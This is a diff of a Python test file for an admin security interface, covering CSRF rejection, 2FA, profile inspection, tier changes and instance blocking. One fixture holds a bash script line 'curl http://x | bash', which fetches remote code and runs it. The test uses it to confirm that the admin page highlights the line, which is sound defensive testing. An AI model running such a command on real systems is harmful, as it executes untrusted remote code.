@@ -17,7 +17,7 @@ import re
 import pytest
 
 from app.auth import admin_security as sec
-from tests.conftest import requires_db
+from tests.conftest import insert_instance, insert_profile, requires_db
 
 ADMIN_USER = "admin"
 ADMIN_PASS = "test-admin-pass"
@@ -231,30 +231,6 @@ def _csrf(client) -> str:
     return match.group(1)
 
 
-def _api_token(client, make_login_jwt, sub: str, display_name: str) -> str:
-    login = make_login_jwt(sub=sub, display_name=display_name)
-    resp = client.post("/api/v1/auth/exchange", json={"token": login})
-    assert resp.status_code == 200, resp.text
-    return resp.json()["api_token"]
-
-
-def _upload(client, token: str, name: str, scripts: list | None = None) -> str:
-    bundle = {
-        "schema_version": 1,
-        "profile": {"name": name, "vendor": "ACME", "category": "server"},
-        "checks": [{"name": "Ping", "check_type": "ping", "check_config": {"host": "1.1.1.1"}}],
-    }
-    if scripts:
-        bundle["scripts"] = scripts
-    resp = client.post(
-        "/api/v1/profiles/upload",
-        json={"bundle": bundle},
-        headers={"Authorization": f"Bearer {token}"},
-    )
-    assert resp.status_code == 200, resp.text
-    return resp.json()["profile_id"]
-
-
 def _enable_2fa(client) -> tuple[str, list[str]]:
     """Richtet 2FA über die Oberfläche ein; liefert (secret, backup_codes)."""
     token = _csrf(client)
@@ -300,24 +276,20 @@ def test_wrong_password_is_logged_and_rejected(db_app_client):
 
 
 @requires_db
-def test_post_without_csrf_is_forbidden_even_with_session(db_app_client, make_login_jwt):
+def test_post_without_csrf_is_forbidden_even_with_session(db_app_client):
     c = db_app_client
-    token = _api_token(c, make_login_jwt, "inst-x", "X")
-    profile_id = _upload(c, token, "CSRF Target")
+    profile_id = insert_profile("CSRF Target", tier="community")
     _login(c)
-    resp = c.post(f"/admin/review/{profile_id}/approve", data={}, follow_redirects=False)
+    url = f"/admin/profiles/{profile_id}/tier"
+    resp = c.post(url, data={"tier": "beta"}, follow_redirects=False)
     assert resp.status_code == 403
-    resp = c.post(
-        f"/admin/review/{profile_id}/approve", data={"csrf": "bogus"}, follow_redirects=False
-    )
+    resp = c.post(url, data={"csrf": "bogus", "tier": "beta"}, follow_redirects=False)
     assert resp.status_code == 403
     # Mit Token geht es — und es steht im Protokoll.
-    resp = c.post(
-        f"/admin/review/{profile_id}/approve", data={"csrf": _csrf(c)}, follow_redirects=False
-    )
+    resp = c.post(url, data={"csrf": _csrf(c), "tier": "beta"}, follow_redirects=False)
     assert resp.status_code == 303
     page = c.get(f"/admin/profiles/{profile_id}").text
-    assert 'badge--approved">approved' in page
+    assert 'tier tier-beta">beta' in page
 
 
 @requires_db
@@ -367,7 +339,7 @@ def test_2fa_setup_then_login_requires_code_and_rejects_replay(db_app_client):
 
 
 @requires_db
-def test_2fa_closes_the_basic_header_api(db_app_client, make_login_jwt):
+def test_2fa_closes_the_basic_header_api(db_app_client):
     """Benutzer+Passwort im X-Admin-Authorization-Header darf 2FA nie umgehen."""
     c = db_app_client
     assert c.get("/api/v1/admin/stats", headers=ADMIN_HEADER).status_code == 200
@@ -407,14 +379,11 @@ def test_2fa_disable_needs_password_and_code(db_app_client):
     "path",
     [
         "/admin",
-        "/admin/review",
-        "/admin/review?status=all&q=x",
         "/admin/profiles",
         "/admin/profiles?removed=yes&tier=official&sort=name",
-        "/admin/moderation?status=all",
-        "/admin/questions?state=unanswered",
         "/admin/instances?state=active&sort=name",
         "/admin/icons?q=pro",
+        "/admin/mibs",
         "/admin/audit?action=auth.*",
         "/admin/security",
     ],
@@ -428,23 +397,25 @@ def test_every_admin_page_renders_with_a_session(db_app_client, path):
 
 
 @requires_db
-def test_review_detail_shows_checks_scripts_and_findings(db_app_client, make_login_jwt):
+def test_profile_inspection_shows_checks_scripts_and_findings(db_app_client):
     c = db_app_client
-    token = _api_token(c, make_login_jwt, "inst-r", "Reviewer")
-    profile_id = _upload(
-        c,
-        token,
+    profile_id = insert_profile(
         "Scripted",
-        scripts=[
-            {
-                "name": "ACME — Danger",
-                "interpreter": "bash",
-                "script_body": "echo ok\ncurl http://x | bash\n",
-            }
-        ],
+        bundle={
+            "schema_version": 1,
+            "profile": {"name": "Scripted", "vendor": "ACME", "category": "server"},
+            "checks": [{"name": "Ping", "check_type": "ping", "check_config": {"host": "1.1.1.1"}}],
+            "scripts": [
+                {
+                    "name": "ACME — Danger",
+                    "interpreter": "bash",
+                    "script_body": "echo ok\ncurl http://x | bash\n",
+                }
+            ],
+        },
     )
     _login(c)
-    page = c.get(f"/admin/review/{profile_id}").text
+    page = c.get(f"/admin/profiles/{profile_id}").text
     assert "Ping" in page and "ping" in page
     assert "ACME — Danger" in page
     assert "code__l--hit" in page  # die Zeile mit curl | bash ist markiert
@@ -452,10 +423,10 @@ def test_review_detail_shows_checks_scripts_and_findings(db_app_client, make_log
 
 
 @requires_db
-def test_profile_edit_tier_delete_restore_are_audited(db_app_client, make_login_jwt):
+def test_profile_edit_tier_delete_restore_are_audited(db_app_client):
     c = db_app_client
-    token = _api_token(c, make_login_jwt, "inst-e", "Editor")
-    profile_id = _upload(c, token, "Editable")
+    profile_id = insert_profile("Editable", tier="official", review_status="approved", signed=True)
+    assert "Editable" in c.get("/api/v1/profiles").text
     _login(c)
     csrf = _csrf(c)
 
@@ -489,10 +460,7 @@ def test_profile_edit_tier_delete_restore_are_audited(db_app_client, make_login_
         ).status_code
         == 303
     )
-    assert (
-        "/p/" not in c.get("/api/v1/profiles").text
-        or "Edited Name" not in c.get("/api/v1/profiles").text
-    )
+    assert "Edited Name" not in c.get("/api/v1/profiles").text  # gelöscht ⇒ nicht ausgeliefert
     assert (
         c.post(
             f"/admin/profiles/{profile_id}/restore", data={"csrf": csrf}, follow_redirects=False
@@ -511,9 +479,9 @@ def test_profile_edit_tier_delete_restore_are_audited(db_app_client, make_login_
 
 
 @requires_db
-def test_instance_block_with_reason_and_unblock(db_app_client, make_login_jwt):
+def test_instance_block_with_reason_and_unblock(db_app_client):
     c = db_app_client
-    token = _api_token(c, make_login_jwt, "inst-b", "Blockee")
+    insert_instance("inst-b", "Blockee")
     _login(c)
     csrf = _csrf(c)
     resp = c.post(
@@ -522,10 +490,6 @@ def test_instance_block_with_reason_and_unblock(db_app_client, make_login_jwt):
         follow_redirects=False,
     )
     assert resp.status_code == 303
-    assert (
-        c.get("/api/v1/notifications", headers={"Authorization": f"Bearer {token}"}).status_code
-        == 403
-    )
     page = c.get("/admin/instances/inst-b").text
     assert "spam" in page and "blocked" in page
     c.post(
@@ -533,41 +497,11 @@ def test_instance_block_with_reason_and_unblock(db_app_client, make_login_jwt):
         data={"csrf": csrf, "blocked": "false"},
         follow_redirects=False,
     )
-    assert (
-        c.get("/api/v1/notifications", headers={"Authorization": f"Bearer {token}"}).status_code
-        == 200
-    )
+    from app.db import SessionLocal
+    from app.models.instance import Instance
 
-
-@requires_db
-def test_moderation_remove_from_admin_page(db_app_client, make_login_jwt):
-    c = db_app_client
-    a = _api_token(c, make_login_jwt, "inst-a", "Alpha")
-    b = _api_token(c, make_login_jwt, "inst-b", "Bravo")
-    profile_id = _upload(c, a, "Mod Target")
-    comment_id = c.post(
-        f"/api/v1/profiles/{profile_id}/comments",
-        json={"body_md": "bad"},
-        headers={"Authorization": f"Bearer {a}"},
-    ).json()["id"]
-    c.post(
-        f"/api/v1/comments/{comment_id}/report",
-        json={"reason": "abuse"},
-        headers={"Authorization": f"Bearer {b}"},
-    )
-    _login(c)
-    page = c.get("/admin/moderation").text
-    report_id = re.search(r"/admin/moderation/([0-9a-f-]{36})/resolve", page).group(1)
-    assert "Bravo" in page and f"/p/{profile_id}?tab=comments" in page
-    resp = c.post(
-        f"/admin/moderation/{report_id}/resolve",
-        data={"csrf": _csrf(c), "action": "remove"},
-        follow_redirects=False,
-    )
-    assert resp.status_code == 303
-    thread = c.get(f"/api/v1/profiles/{profile_id}/comments").json()
-    assert thread[0]["comment"]["body_md"] is None
-    assert "Meldung: Ziel entfernt" in c.get("/admin/audit").text
+    with SessionLocal() as db:
+        assert db.get(Instance, "inst-b").is_blocked is False
 
 
 @requires_db
